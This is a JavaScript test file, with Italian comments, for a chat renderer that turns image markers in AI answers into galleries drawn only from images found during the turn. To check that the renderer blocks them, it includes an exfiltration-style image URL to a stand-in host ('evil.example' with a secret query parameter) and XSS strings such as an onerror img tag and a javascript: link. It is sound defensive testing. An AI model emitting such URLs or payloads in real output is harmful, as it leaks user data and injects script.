// Le immagini nelle risposte (#2272): il marcatore lo controlla il codice contro le immagini del turno, e il renderer
// disegna solo le gallerie controllate, mai un indirizzo scritto dal modello.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const require = createRequire(import.meta.url);
const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
require(join(ROOT, 'src', 'shared', 'sitiComuni.js'));
require(join(ROOT, 'src', 'shared', 'fontiCitate.js'));
require(join(ROOT, 'src', 'shared', 'immaginiRisposta.js'));
require(join(ROOT, 'src', 'shared', 'filoMarkdown.js'));
const I = globalThis.SN_IMMAGINI_RISPOSTA;
const MD = globalThis.SN_MARKDOWN;

const copia = (n) => `filo://icone/${String(n).repeat(40).slice(0, 40)}.jpg`;
const trovate = (...ids) => ({
  type: 'IMMAGINI_WEB',
  _output: { cerca: 'antilope', immagini: ids.map((id, k) => ({ id, src: copia(k + 1), titolo: `Antilope ${id}`, sito: 'commons.wikimedia.org', pagina: `https://commons.wikimedia.org/wiki/File:${id}.jpg` })) },
});

test('il marcatore diventa una galleria al suo posto, con le sole immagini del turno e nell\'ordine scritto', () => {
  const r = I.controllaConFonti('Ecco le antilopi.\n\n[[immagini: i3, i1, inventata]]\n\nLa seconda è un impala.', [trovate('i1', 'i2', 'i3')]);
  assert.equal(r.text, 'Ecco le antilopi.\n\nLa seconda è un impala.');
  assert.equal(r.immagini.length, 1);
  assert.deepEqual(r.immagini[0].voci.map((v) => v.titolo), ['Antilope i3', 'Antilope i1']);
  assert.equal(r.text.slice(0, r.immagini[0].pos), 'Ecco le antilopi.');
  const html = MD.render(r.text, { immagini: r.immagini });
  assert.ok(html.indexOf('Ecco le antilopi.') < html.indexOf('filo-galleria'), 'la galleria sta dopo la prima frase');
  assert.ok(html.indexOf('filo-galleria') < html.indexOf('La seconda'), 'e prima della seconda');
  assert.equal((html.match(/class="filo-galleria-img"/g) || []).length, 2);
  assert.ok(!html.includes('[[immagini'));
});

test('testo e immagini si alternano: due marcatori, due gallerie fra i paragrafi giusti', () => {
  const r = I.controllaConFonti('Il maschio:\n[[immagine: i1]]\nLa femmina:\n[[immagine: i2]]\nFine.', [trovate('i1', 'i2')]);
  const html = MD.render(r.text, { immagini: r.immagini });
  const posti = ['Il maschio', 'Antilope i1', 'La femmina', 'Antilope i2', 'Fine.'].map((s) => html.indexOf(s));
  assert.deepEqual([...posti].sort((a, b) => a - b), posti, html);
  assert.ok(posti.every((p) => p >= 0));
  assert.equal((html.match(/filo-galleria-una/g) || []).length, 2, 'un\'immagine sola non è un carosello');
});

test('senza nessun marcatore le immagini trovate finiscono in coda; con un marcatore le altre no', () => {
  const senza = I.controllaConFonti('Ecco le antilopi che ho trovato.', [trovate('i1', 'i2')]);
  assert.equal(senza.immagini.length, 1);
  assert.equal(senza.immagini[0].voci.length, 2);
  assert.equal(senza.immagini[0].pos, senza.text.length);
  const con = I.controllaConFonti('Questa: [[immagini: i2]]', [trovate('i1', 'i2')]);
  assert.equal(con.immagini.length, 1);
  assert.deepEqual(con.immagini[0].voci.map((v) => v.titolo), ['Antilope i2']);
});

test('un\'immagine creata e non citata resta sempre, in coda, segnata come creata con l\'AI', () => {
  const generata = { type: 'GENERA_IMMAGINE', _output: { immagini: [{ id: 'g1', src: copia(7), titolo: 'Un gatto astronauta', generata: true }] } };
  const r = I.controllaConFonti('Ecco il tuo gatto.', [generata]);
  assert.equal(r.immagini.length, 1);
  const html = MD.render(r.text, { immagini: r.immagini });
  assert.match(html, /data-generata="1"/);
  assert.match(html, /Creata con l’AI/);
});

test('un indirizzo scritto dal modello non diventa mai un\'immagine, nemmeno imitando il markup o i posti privati', () => {
  const r = I.controllaConFonti('Guarda [[immagini: https://evil.example/x.png?d=segreto]] e ![](https://evil.example/y.png) <img src="https://evil.example/z.png"> 0', [trovate('i1')]);
  const html = MD.render(r.text, { immagini: r.immagini });
  assert.ok(!html.includes('evil.example/x.png'));
  assert.ok(!/<img[^>]+evil\.example/.test(html), html);
  // L'unica galleria è quella delle immagini del turno, in coda perché nessun marcatore valido le cita.
  assert.equal((html.match(/class="filo-galleria-img"/g) || []).length, 1);
  // Una galleria salvata con una sorgente esterna non si disegna.
  const finta = MD.render('Testo', { immagini: [{ pos: 0, voci: [{ src: 'https://evil.example/a.png', titolo: 'x' }] }] });
  assert.ok(!finta.includes('evil.example'));
  assert.ok(!finta.includes('filo-galleria'));
});

test('titoli e siti che portano HTML restano testo', () => {
  const a = trovate('i1');
  a._output.immagini[0].titolo = '<img src=x onerror=alert(1)>"\'';
  a._output.immagini[0].sito = '<b>sito</b>';
  const r = I.controllaConFonti('[[immagini: i1]]', [a]);
  const html = MD.render(r.text, { immagini: r.immagini });
  assert.ok(!html.includes('<img src=x'));
  assert.ok(!html.includes('<b>sito'));
});

test('fonti e immagini nella stessa risposta tengono ognuna il proprio posto', () => {
  const url = 'https://it.wikipedia.org/wiki/Antilope';
  const lettura = { type: 'LEGGI_PAGINA', url, _output: { pageRead: url, ok: true, url, titolo: 'Antilope', testo: 'Le antilopi vivono in Africa e in Asia.' } };
  const r = I.controllaConFonti(`[[immagini: i1, i2]]\n\nVivono in Africa. [[fonte: ${url} | Le antilopi vivono in Africa e in Asia]] Corrono veloci.`, [trovate('i1', 'i2'), lettura]);
  assert.equal(r.text, 'Vivono in Africa. Corrono veloci.');
  assert.equal(r.fonti.length, 1);
  assert.equal(r.text.slice(0, r.fonti[0].pos), 'Vivono in Africa.');
  assert.equal(r.immagini[0].pos, 0);
  const html = MD.render(r.text, { fonti: r.fonti, immagini: r.immagini });
  assert.ok(html.indexOf('filo-galleria') < html.indexOf('Vivono'));
  assert.ok(html.indexOf('Vivono in Africa.') < html.indexOf('filo-fonte'));
  assert.ok(html.indexOf('filo-fonte') < html.indexOf('Corrono'));
});

test('in diretta i marcatori, anche a metà, non si vedono', () => {
  assert.equal(I.nascondi('Ecco: [[immagini: i1, i2]] fatto'), 'Ecco: fatto');
  assert.equal(I.nascondi('Ecco [[immag'), 'Ecco ');
  assert.equal(I.nascondi('Ecco [[immagini: i1'), 'Ecco ');
});

test('sul disco restano solo i campi noti, e le copie usate si ritrovano dai messaggi', () => {
  const salvate = I.perIlDisco([{ pos: 3, voci: [{ src: copia(1), titolo: 't', extra: 'no', pagina: 'javascript:alert(1)' }, { src: 'https://x.example/a.png' }] }, { pos: 99, voci: [{ src: copia(2) }] }], 'abcdef');
  assert.deepEqual(salvate, [{ pos: 3, voci: [{ src: copia(1), titolo: 't', sito: '' }] }]);
  assert.deepEqual(I.copieDi([{ immagini: salvate }, { text: 'x' }]), [copia(1)]);
});
